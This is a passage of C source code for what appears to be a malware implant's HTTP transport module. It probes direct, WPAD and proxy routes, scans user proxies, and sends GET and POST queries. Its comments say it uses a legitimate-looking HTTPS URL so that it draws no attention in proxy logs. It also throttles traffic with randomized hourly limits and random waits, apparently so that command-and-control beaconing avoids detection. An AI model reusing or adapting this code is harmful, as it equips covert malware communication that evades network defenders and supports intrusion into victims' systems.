		if (!hSession) { break; }

#ifndef NO_HTTPS_ACCESS_CHECK_IN_TRANSPORT

		// step 3
		// due to *.windowsupdate.com may be specially opened at firewall, use some other url for testing, which is unlikely to be added to firewall exception,
		// and should not trigger special attention when found in proxy logs
		// So to bypass this, select one of legitimate https urls for check
		LPWSTR wszHttpsLegitimateUrl = _tswhttpSelectLegitimateHttpsUrl();

		DbgPrint("attempting to check secure url [%ws]", wszHttpsLegitimateUrl);
		if (!_tswhttpMakeQuery(hSession, REQUEST_TYPE_GET, wszHttpsLegitimateUrl, NULL, NULL, NULL, 0)) { 
		
			// need to call twice for https
			if (!_tswhttpMakeQuery(hSession, REQUEST_TYPE_GET, wszHttpsLegitimateUrl, NULL, NULL, NULL, 0)) {
				DbgPrint("ERR: query failed"); _tswhttpClose(hSession); hSession = NULL;
			} // attempt 2

		} // attempt 1
		
		my_free(wszHttpsLegitimateUrl);
		if (!hSession) { break; }

#endif

		DbgPrint("got to the end of check, looks like connection OK");

	} while (FALSE); // not a loop

	

	return hSession;
}






/*
	Tests, initializes and in case of success, returns handle to internal transport handle structure
*/
PTRANSPORT_HANDLE tswhttpInitTransport()
{
	HINTERNET hSession = NULL;	// WinHTTP session handle
	PTRANSPORT_HANDLE pTransport = NULL;
	NETWORK_CONNECTION_TYPE ncType = NCT_REMOTE_PROXY;	// type of connection detected, should be used only if hSession != NULL
	WHT_INTERNAL_CONTEXT *whInternalContext = NULL;

	do { // not a loop

		// try all supported connection methods

		// CONNECTION_DIRECT 
		if (hSession = _tswhttpTestConnection(CONNECTION_DIRECT, NULL)) { ncType = NCT_REMOTE_DIRECT; break; }

		// CONNECTION_WPAD_AUTOPROXY
		if (hSession = _tswhttpTestConnection(CONNECTION_WPAD_AUTOPROXY, NULL)) { break; }

		// CONNECTION_PROXY_CONFIGURED
		if (hSession = _tswhttpTestConnection(CONNECTION_PROXY_CONFIGURED, NULL)) { break; }

		// if failed all of the above, use proxy scanning instead
		tswhttpEnumUserProxy(cbProxyEnum, &hSession);

	} while (FALSE);	 // not a loop

	// check if init done
	if (!hSession) { DbgPrint("ERR: failed to init transport"); return NULL; }

	// session checked and inited, fill PTRANSPORT_HANDLE result
	//DbgPrint("OK: transport inited, preparing handle structure for caller");
	pTransport = (PTRANSPORT_HANDLE)my_alloc(sizeof(TRANSPORT_HANDLE));
	
	// fill structure
	// save ncType detected into resulting structure
	pTransport->wLen = sizeof(TRANSPORT_HANDLE);
	pTransport->ncType = ncType;
	pTransport->dwMaxSuggestedDataLen = 2 * 1024 * 1024;	// 2MB, may be adjusted up to 5-10MB according to server settings

	// api funcs
	pTransport->fQuery = tswhttpTransportSend;
	pTransport->fDispose = tswhttpDisposeTransport;

	// internal context to store init results
	whInternalContext = (WHT_INTERNAL_CONTEXT *)my_alloc(sizeof(WHT_INTERNAL_CONTEXT));
	whInternalContext->hSession = hSession;

	pTransport->pInternalModuleContext = whInternalContext;

	return pTransport;
}

/*
	Called when it is time to safely free all resources allocated by transport
	For ex., when transport re-init about to be performed.
	If is up to caller to make sure no query to other transport's function is being performed
*/
VOID CALLBACK tswhttpDisposeTransport(PTRANSPORT_HANDLE pTransport)
{
	WHT_INTERNAL_CONTEXT *whInternalContext = NULL;

	//DbgPrint("disposing pTransport=%p", pTransport);

	// WHT_INTERNAL_CONTEXT.hSession
	if (pTransport->pInternalModuleContext) {

		whInternalContext = (WHT_INTERNAL_CONTEXT *)pTransport->pInternalModuleContext;
		if (whInternalContext->hSession) { WinHttpCloseHandle(whInternalContext->hSession); }
		my_free(whInternalContext);

	} // pInternalModuleContext set

	my_free(pTransport);

	//DbgPrint("done for pTransport=%p", pTransport);

}


/*
	Performs accounting of queries, it's time distribution and
	implements a wait before passing to an actual query API
	NB: this routine will not return until a sufficient wait is performed
*/
VOID tswhttpWaitQueryLimits(WHT_INTERNAL_CONTEXT *whContext)
{
	RndClass rg = { 0 };		// random generator object
	SYSTEMTIME st = { 0 };		// local time for storing current hour (maybe use GetTickCount() instead later ?)

	// init rnd generator
	rgNew(&rg);

	// query current time
	GetLocalTime(&st);

	// check if structure was inited
	if ((!whContext->dwQueryCountCurrentHour) || (whContext->wWaitHour != st.wHour)) {

		// init structure and exit
		whContext->dwQueryCountCurrentHour=1;
		whContext->wWaitHour = st.wHour;
		whContext->dwMaxQueryCountSelected = rg.rgGetRnd(&rg, MAX_QUERIES_IN_HOUR_MIN, MAX_QUERIES_IN_HOUR_MAX);
		DbgPrint("selected max queries for hour as %u", whContext->dwMaxQueryCountSelected);
		return;

	} // if need to reinit structure

	// check for in hour amount
	if (whContext->dwQueryCountCurrentHour == whContext->dwMaxQueryCountSelected) {

		DbgPrint("per hour query limit reached (%u), waiting for %u mins until next hour", whContext->dwMaxQueryCountSelected, (DWORD)(60 - st.wMinute + 1) );
		Sleep(((60 - st.wMinute + 1) * 60 * 1000));
		return;

	} // query limit reached

	// get here if no limits still, just update and select random wait
	whContext->dwQueryCountCurrentHour++;
	Sleep(rg.rgGetRnd(&rg, WAIT_BETWEEN_QUERIES_SEC_MIN, WAIT_BETWEEN_QUERIES_SEC_MAX) * 1000);
	//DbgPrint("wait done");

}


/*
	API function to be exported
*/
BOOL CALLBACK tswhttpTransportSend(PTRANSPORT_HANDLE pTransport,  PTRANSPORT_QUERY pQuery)
{
	BOOL bRes = FALSE;	// default func result
	WHT_QUERY_TYPE whQuery;	// translated internal query type
	WHT_INTERNAL_CONTEXT *whContext = (WHT_INTERNAL_CONTEXT *)pTransport->pInternalModuleContext;

	// check input params
	if (!pTransport || !pQuery) { DbgPrint("ERR: invalid input params"); return bRes; }

	// check supported query types
	switch (pQuery->tqType) {

		case QT_GET: whQuery = REQUEST_TYPE_GET; break;
		case QT_POST: whQuery = REQUEST_TYPE_POST; break;

		default: DbgPrint("ERR: unsupported query type id %u", pQuery->tqType); return bRes;

	}	// switch

	// delay between queries check & wait
	tswhttpWaitQueryLimits(whContext);

	// issue call
	bRes = _tswhttpMakeQuery(whContext->hSession, whQuery, pQuery->wszTarget, pQuery->pAnswer, pQuery->dwAnswerLen, pQuery->pSendBuffer, pQuery->lSendBufferLen);

	// modify transport's status
	if (bRes) {
		// success, reset errors count
		pTransport->dwLastFailedConnectionAttempts = 0;
	} else {
		// failure, inc attempt count
		pTransport->dwLastFailedConnectionAttempts++;
	} // bRes

	return bRes;
}